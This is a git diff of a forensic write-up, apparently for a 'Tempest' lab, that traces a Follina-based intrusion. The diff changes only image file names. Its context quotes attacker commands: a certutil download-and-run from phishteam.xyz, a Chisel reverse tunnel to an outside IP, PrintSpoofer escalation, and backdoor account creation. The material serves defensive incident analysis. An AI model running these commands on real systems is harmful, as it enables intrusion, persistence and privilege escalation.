@@ -69,7 +69,7 @@ MOTW being present but not preventing the exploit is worth stating plainly rathe
 
 At 17:13:35.180, `msdt.exe` (PID 4868, child of WINWORD) is invoked via the `ms-msdt:` URI handler with the `PCWDiagnostic` troubleshooter — the classic Follina vector, no macros required:
 
-![msdt.exe full command line — Follina exploit](./assets/ExecutableInfo-mpsigstub_exe-Tempest.png)
+![msdt.exe full command line — Follina exploit](./assets/ExecutableInfo-mpsigstub.exe-Tempest.png)
 
 The embedded Base64 payload decodes cleanly via CyberChef to:
 
@@ -92,19 +92,19 @@ The decoded script explicitly ends in `rm update.zip` — cleanup is confirmed a
 
 AbuseIPDB shows 20 reports against the hosting IP, but 0% abuse confidence, and every report is dated roughly three years after this campaign — unrelated WordPress/web-app scanning noise, assessed as IP churn on a shared cloud host, not attributable to this incident:
 
-![AbuseIPDB — 167.71.199.191](./assets/VirusTotal-167_71_199_191-Tempest.png)
+![AbuseIPDB — 167.71.199.191](./assets/VirusTotal-167.71.199.191-Tempest.png)
 
 ### 2.3 Persistence, Stage 1 — Startup Folder
 **MITRE ATT&CK:** `T1547.001` Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
 
 `sdiagnhost.exe` (PID 2628) writes both `update.zip` and `update.lnk` into the Startup folder, 2.5 seconds apart:
 
-![update.zip write to Startup folder](./assets/Update_Zip-Payload-Tempest.png)
-![update.lnk write to Startup folder](./assets/UpdateLNK-Persistence-Payload_Tempest.png)
+![update.zip write to Startup folder](./assets/Update.Zip-Payload-Tempest.png)
+![update.lnk write to Startup folder](./assets/UpdateLNK-Persistence-Payload,Tempest.png)
 
 Wireshark confirms the corresponding network fetch, including the actual zip contents visibly containing `update.lnk` as an internal archive entry:
 
-![Wireshark Follow TCP Stream — update.zip download](./assets/Update_zip-WireShark-FollowTCPStream-Tempest.png)
+![Wireshark Follow TCP Stream — update.zip download](./assets/Update.zip-WireShark-FollowTCPStream-Tempest.png)
 
 ### 2.4 Execution, Stage 2 — LOLBin Download
 **MITRE ATT&CK:** `T1218.011` System Binary Proxy Execution *(certutil variant)*, `T1105` Ingress Tool Transfer
@@ -115,7 +115,7 @@ The Startup shortcut fires on the next interactive logon. Explorer spawns PowerS
 certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
 ```
 
-![first.exe download command and hash](./assets/First_exe-Download-PayloadAndSHA256-Tempest.png)
+![first.exe download command and hash](./assets/First.exe-Download-PayloadAndSHA256-Tempest.png)
 
 `first.exe` (SHA256 `CE278CA2...FC7C3D7D8`) returned **no VirusTotal results at all** — never previously submitted to the platform, arguably a stronger evasion signal than a low detection count would be.
 
@@ -129,16 +129,16 @@ Two **separate, independent** implant sessions were identified to the same C2 do
 | `first.exe` (PID 8948) | benimaru, Medium IL | **80** | Sole Event ID 3 record for this PID — no port-8080 activity |
 | `final.exe` (PID 8264) | SYSTEM | **8080** | All Event ID 3 records for this PID are port 8080 — no port-80 activity |
 
-![first.exe network connection — port 80](./assets/first_exe-C2DestinationPort-Tempest.png)
-![first.exe DNS query for resolvecyber.xyz](./assets/First_exe-C2DomainConnection-Tempst.png)
+![first.exe network connection — port 80](./assets/first.exe-C2DestinationPort-Tempest.png)
+![first.exe DNS query for resolvecyber.xyz](./assets/First.exe-C2DomainConnection-Tempst.png)
 
 The port-8080 channel is the fully-characterized beacon: `User-Agent: Nim httpclient/1.6.6` (a custom Nim implant), `Server: BaseHTTP/0.3 Python/2.7.18` (a bespoke Python C2 server) — a pull-based protocol where the server issues a command in the response body and the client reports results back via the `q=` query parameter:
 
-![Wireshark — resolvecyber.xyz beacon, User-Agent and Server headers](./assets/resolvecyber_xyz-Wireshark-TCPFollowStream-UserAgent-Tempest.png)
+![Wireshark — resolvecyber.xyz beacon, User-Agent and Server headers](./assets/resolvecyber.xyz-Wireshark-TCPFollowStream-UserAgent-Tempest.png)
 
 Two beacon response bodies decoded cleanly enough to confirm attacker-issued commands rather than inferred activity — `whoami` and `whoami /priv`, both attributable to `final.exe`'s session given the port-8080 confirmation above:
 
-![Decoded beacon command — whoami /priv](./assets/resolvecyber_xyz-wireshark-whoamipriv-Tempest.png)
+![Decoded beacon command — whoami /priv](./assets/resolvecyber.xyz-wireshark-whoamipriv-Tempest.png)
 
 ### 2.6 Discovery & Credential Access
 **MITRE ATT&CK:** `T1552.001` Unsecured Credentials: Credentials In Files, `T1087` Account Discovery
@@ -166,7 +166,7 @@ C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
 
 VirusTotal identifies it cleanly as **Chisel**, a TCP tunneling tool (55/68 detections, `hacktool.chisel/hack`):
 
-![VirusTotal — ch.exe identified as Chisel](./assets/VirusTotal-CH_exe-Tempest.png)
+![VirusTotal — ch.exe identified as Chisel](./assets/VirusTotal-CH.exe-Tempest.png)
 
 This establishes a reverse SOCKS5 proxy back to the same host that serves the initial document — dual-purpose delivery-and-tunnel infrastructure. This tunnel is the most plausible explanation for the WinRM session below, since no directly-traceable external Event ID 4624 logon-type-3 source was ever found for it — the connection most likely arrived *through* the tunnel rather than as a direct external connection.
 
@@ -175,28 +175,28 @@ This establishes a reverse SOCKS5 proxy back to the same host that serves the in
 
 A WinRM session (`wsmprovhost.exe`, benimaru context) checks `whoami /priv` for `SeImpersonatePrivilege`, then downloads `final.exe`:
 
-![whoami /priv via WinRM PowerShell session](./assets/whoami-priv-wsmprovhost_exe-Tempest.png)
-![final.exe download command](./assets/final_exe-download-tempest.png)
+![whoami /priv via WinRM PowerShell session](./assets/whoami-priv-wsmprovhost.exe-Tempest.png)
+![final.exe download command](./assets/final.exe-download-tempest.png)
 
 `spf.exe` — confirmed as **PrintSpoofer64.exe** via VirusTotal (56/70) — runs `spf.exe -c C:\ProgramData\final.exe`:
 
-![VirusTotal — spf.exe identified as PrintSpoofer64.exe, with code insights](./assets/SPF_exe-Hash-Tempest.png)
-![final.exe process creation, parented by spf.exe](./assets/Final_exe-ParentSPF_exe-Tempest.png)
+![VirusTotal — spf.exe identified as PrintSpoofer64.exe, with code insights](./assets/SPF.exe-Hash-Tempest.png)
+![final.exe process creation, parented by spf.exe](./assets/Final.exe-ParentSPF.exe-Tempest.png)
 
 VirusTotal's static analysis confirms the exact mechanism: PrintSpoofer creates a named pipe, coerces the Print Spooler service into connecting to it, impersonates the resulting client token, and launches an arbitrary process as SYSTEM via `CreateProcessWithTokenW`. `final.exe`'s own process-creation event independently corroborates this — it is born directly under `NT AUTHORITY\SYSTEM` (LogonId `0x3E7`, the well-known SYSTEM session) at the exact instant of creation, not escalated gradually:
 
-![final.exe creation event — LogonId 0x3E7, SYSTEM](./assets/final_exe-creation-tempest.png)
+![final.exe creation event — LogonId 0x3E7, SYSTEM](./assets/final.exe-creation-tempest.png)
 
 `final.exe` itself (SHA256 `03E1840A...7A74E6`) sits at only 11/70 on VirusTotal, with no named family — a notably weaker detection footprint than the public PrintSpoofer tool, consistent with a custom final-stage payload:
 
-![VirusTotal — final.exe, generic/unnamed detection](./assets/Final_exe-Hash-VirusTotal-Tempest.png)
+![VirusTotal — final.exe, generic/unnamed detection](./assets/Final.exe-Hash-VirusTotal-Tempest.png)
 
 ### 2.9 Persistence, Stage 2
 **MITRE ATT&CK:** `T1136.001` Create Account: Local Account, `T1543.003` Create or Modify System Process: Windows Service, `T1098` Account Manipulation
 
 All commands below run as SYSTEM, as direct children of `final.exe`. The full Executable Info command list gives the complete chronological order in one view:
 
-![Full persistence-stage command sequence](./assets/final_exe-attackChain-persistence-tempest.png)
+![Full persistence-stage command sequence](./assets/final.exe-attackChain-persistence-tempest.png)
 
 Two genuine mistakes precede the first successful account creation, worth documenting rather than smoothing over:
 
@@ -214,12 +214,12 @@ Two genuine mistakes precede the first successful account creation, worth docume
 | 17:27:28.604 | `net user /add shion m4st3rch3f!` | **SUCCESS** |
 | 17:27:41.274 | `net localgroup administrators /add shion` | shion → local Administrators |
 
-![Administrator password change](./assets/Final_exe-AdminChangePassword-Tempest.png)
-![shuna account created successfully](./assets/Final_exe-AddShuna-Tempest.png)
+![Administrator password change](./assets/Final.exe-AdminChangePassword-Tempest.png)
+![shuna account created successfully](./assets/Final.exe-AddShuna-Tempest.png)
 ![shion added to Administrators](./assets/AddShionToAdminGroup-Tempest.png)
-![TempestUpdate service creation](./assets/Final_exe-TempestUpdate-Payload-Tempest.png)
-![TempestUpdate2 service creation](./assets/Final_exe-TempestUpdate2-Payload-Tempest.png)
-![sc qc TempestUpdate2 verification](./assets/Final_exe-TempestUpdate2QC-Tempest.png)
+![TempestUpdate service creation](./assets/Final.exe-TempestUpdate-Payload-Tempest.png)
+![TempestUpdate2 service creation](./assets/Final.exe-TempestUpdate2-Payload-Tempest.png)
+![sc qc TempestUpdate2 verification](./assets/Final.exe-TempestUpdate2QC-Tempest.png)
 
 The Windows Security log independently corroborates the account-management side of this: Event ID 4720 (account creation) ×2, 4724 (password set) ×3, 4732 (privileged group addition — `MemberSid` confirms specifically `shion`, not `shuna`):
 
